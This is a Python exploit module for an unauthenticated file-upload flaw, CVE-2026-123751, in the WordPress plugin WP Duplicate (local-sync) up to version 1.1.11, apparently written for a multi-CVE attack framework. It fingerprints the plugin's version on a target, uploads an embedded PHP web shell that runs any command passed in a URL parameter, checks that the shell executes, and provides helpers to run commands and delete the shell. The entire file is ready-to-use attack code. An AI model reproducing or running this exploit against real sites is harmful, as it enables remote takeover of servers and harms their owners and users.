# -*- coding: utf-8 -*-
# CVE-2026-123751 — WP Duplicate (local-sync) <= 1.1.11 unauth arbitrary file upload
# Callable module. No import side-effects. Stdlib only. Thread-safe.
# Usage:
#     from function.cve_2026_123751 import exploit, run, cleanup, fingerprint
#     r = exploit('https://target.com')
#     if r['exploited']:
#         print(run(r['shell_url'], 'id'))
# Coded by @Mushr00w — refactored for multi-CVE framework
import base64
import json
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
import zlib

SUCCESS = "save_single_big_file_success"
BACKUPS = "/wp-content/uploads/local_sync/backups/"
UA = "shelldrop-CVE-2026-123751"
FIXED_IN = (1, 1, 12)
DEFAULT_TIMEOUT = 30

SHELL = b"""<?php
header('Content-Type: text/plain');
if (!isset($_GET['c'])) {
    echo "user=".get_current_user()." uid=".getmyuid()."\\n";
    echo "uname=".php_uname()."\\n";
    echo "php=".PHP_VERSION."\\n";
    echo "docroot=".realpath(__DIR__.'/../../../..')."\\n";
    echo "docroot_writable=".(is_writable(__DIR__.'/../../../..')?'yes':'no')."\\n";
    echo "open_basedir=".(ini_get('open_basedir')?:'none')."\\n";
    echo "disable_functions=".(ini_get('disable_functions')?:'none')."\\n";
    echo "\\nusage: ?c=<command>\\n";
    return;
}
passthru($_GET['c'].' 2>&1');
"""


# ────────────── HTTP layer ──────────────
def _http(url, data=None, timeout=DEFAULT_TIMEOUT, method=None):
    req = urllib.request.Request(
        url, data=data, method=method or ("POST" if data else "GET"),
        headers={"User-Agent": UA, "Content-Type": "text/plain"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read()


def _status(url, timeout=DEFAULT_TIMEOUT):
    try:
        return _http(url, timeout=timeout, method="HEAD")[0]
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError:
        return 0


# ────────────── public helpers (dipakai main.py juga) ──────────────
def fingerprint(target, timeout=DEFAULT_TIMEOUT):
    """
    Return (slug_seen: bool, version: tuple|None).
    Raises urllib.error.URLError if unreachable.
    """
    _, body = _http(target.rstrip("/") + "/", timeout=timeout)
    page = body.decode("utf-8", "replace")
    seen = "local-sync" in page
    versions = re.findall(r"local-sync[^\"']*?[?&]ver=([0-9][0-9.]*)", page)
    best = None
    for v in versions:
        try:
            t = tuple(int(x) for x in v.strip(".").split("."))
        except ValueError:
            continue
        best = max(best, t) if best else t
    return seen, best


def upload(target, name, body, timeout=DEFAULT_TIMEOUT):
    """
    Upload a PHP payload via the CVE. Returns shell URL on success.
    Raises RuntimeError if the plugin rejects the upload.
    """
    payload = {
        "is_local_sync": True,
        "action": "handle_upload_single_big_file",
        "prod_key_random_id": True,
        "file_name": name,
        "file_data": zlib.compress(body).hex(),
        "start_range": 0,
        "end_range": 0,
    }
    data = base64.b64encode(json.dumps(payload).encode())
    code, raw = _http(target.rstrip("/") + "/?x=1", data=data, timeout=timeout)
    text = raw.decode("utf-8", "replace")
    if SUCCESS not in text:
        raise RuntimeError(f"upload rejected (HTTP {code}): {text[:400]}")
    return target.rstrip("/") + BACKUPS + name


def run(shell_url, cmd, timeout=DEFAULT_TIMEOUT):
    """Execute a command via an already-uploaded shell. Returns stdout+stderr."""
    code, raw = _http(shell_url + "?c=" + urllib.parse.quote(cmd, safe=""),
                      timeout=timeout)
    if code != 200:
        raise RuntimeError(f"HTTP {code}")
    return raw.decode("utf-8", "replace")


def verify(shell_url, timeout=DEFAULT_TIMEOUT):
    """Nonce round-trip. Returns the nonce on success, raises otherwise."""
    nonce = secrets.token_hex(8)
    out = run(shell_url, f"echo {nonce}", timeout)
    if nonce not in out:
        raise RuntimeError("shell uploaded but does not execute:\n" + out[:400])
    return nonce


def cleanup(shell_url, shell_name, timeout=DEFAULT_TIMEOUT):
    """Delete the uploaded shell. Returns (deleted: bool, detail: str)."""
    try:
        run(shell_url, f"rm -f {shell_name}", timeout)
    except Exception as e:
        return False, f"delete command failed ({e}); remove by hand: rm -f {shell_name}"
    code = _status(shell_url, timeout)
    if code == 404:
        return True, f"deleted {shell_name} (404)"
    return False, f"still answering (HTTP {code}), check by hand"


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, shell_name=None, overwrite=False, force=False,
            debug=False, timeout=DEFAULT_TIMEOUT):
    """
    Exploit CVE-2026-123751 (WP Duplicate `local-sync` <= 1.1.11 unauth upload).

    Args:
        target_url : str  — 'http://x.com', 'x.com', 'https://x.com/'
        shell_name : str  — remote filename (default: poc-<8hex>.php)
        overwrite  : bool — allow overwriting an existing filename
        force      : bool — continue if fingerprint fails or version looks patched
        debug      : bool — collect step-by-step log into result['log']
        timeout    : int  — per-request timeout (seconds)

    Returns:
        dict — see keys below. 'exploited' = True only when shell is uploaded
        AND verified to execute.
    """
    result = {
        'target': target_url,
        'cve': 'CVE-2026-123751',
        'plugin': 'not detected',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'shell_name': '',
        'marker': '',
        'version': None,
        'detail': '',
        'exploited': False,
        'log': [],
    }
    log = result['log']

    def _step(msg):
        if debug:
            log.append(msg)

    # 1. normalize target
    t = target_url.strip()
    if not t:
        result['detail'] = 'empty target'
        return result
    if '://' not in t:
        t = 'https://' + t
    t = t.rstrip('/')
    result['target'] = t

    # 2. fingerprint
    try:
        seen, version = fingerprint(t, timeout)
    except Exception as e:
        result['detail'] = f'unreachable: {e}'
        return result

    if version:
        vstr = '.'.join(map(str, version))
        result['version'] = vstr
        _step(f'fingerprint: local-sync version {vstr}')
    else:
        _step('fingerprint: local-sync seen (no version)')

    if not seen:
        msg = 'local-sync not referenced on the homepage'
        if not force:
            result['detail'] = msg + ' (use force=True)'
            return result
        _step(msg + ' — continuing (force=True)')
    else:
        result['plugin'] = 'detected'
        if version and version >= FIXED_IN:
            msg = f'version {result["version"]} >= {_vstr(FIXED_IN)}, likely patched'
            _step(msg)
            if not force:
                result['detail'] = msg + ' (use force=True)'
                return result
        elif version:
            _step(f'local-sync {result["version"]} is in the vulnerable range (<= 1.1.11)')

    # 3. prep name
    name = shell_name or f'poc-{secrets.token_hex(4)}.php'
    result['shell_name'] = name
    final_url = t + BACKUPS + name
    result['endpoint'] = final_url

    if _status(final_url, timeout) == 200 and not overwrite:
        result['detail'] = f'{final_url} already exists (HTTP 200); use overwrite=True or another shell_name'
        return result

    # 4. upload
    _step(f'uploading {name} ({len(SHELL)} B)')
    try:
        shell_url = upload(t, name, SHELL, timeout)
    except Exception as e:
        result['detail'] = str(e)
        return result
    result['shell_url'] = shell_url
    result['endpoint'] = shell_url
    result['http_status'] = 200
    _step(f'shell at {shell_url}')

    # 5. verify execution
    try:
        nonce = verify(shell_url, timeout)
    except Exception as e:
        result['detail'] = f'{e} (shell left at {shell_url})'
        result['vulnerable'] = True   # upload nyata = vulnerable
        result['rce_verified'] = 'UPLOADER'
        return result

    result['vulnerable'] = True
    result['exploited'] = True
    result['rce_verified'] = 'SHELL EXEC'
    result['marker'] = nonce
    _step(f'nonce round-trip ok ({nonce})')

    # 6. prova exec pertama (bukti output nyata, bukan nonce saja)
    try:
        first = run(shell_url, 'id', timeout).strip()
        if first:
            result['output'] = first[:300]
    except Exception:
        pass

    result['detail'] = 'shell uploaded and verified'
    return result


def _vstr(v):
    return '.'.join(map(str, v))


# ────────────── optional convenience: full lifecycle ──────────────
def exploit_and_run(target_url, cmd=None, cleanup_after=False, **kwargs):
    """
    Convenience: exploit, optionally run one command, optionally cleanup.
    Returns dict (same as exploit) + 'cmd_output' key.
    """
    result = exploit(target_url, **kwargs)
    result['cmd_output'] = ''

    if result['exploited'] and cmd is not None:
        try:
            result['cmd_output'] = run(result['shell_url'], cmd, kwargs.get('timeout', DEFAULT_TIMEOUT))
        except Exception as e:
            result['cmd_output'] = f'[!] {e}'

    if cleanup_after and result['shell_url'] and result['shell_name']:
        deleted, detail = cleanup(result['shell_url'], result['shell_name'],
                                  kwargs.get('timeout', DEFAULT_TIMEOUT))
        result['cleanup_deleted'] = deleted
        result['cleanup_detail'] = detail

    return result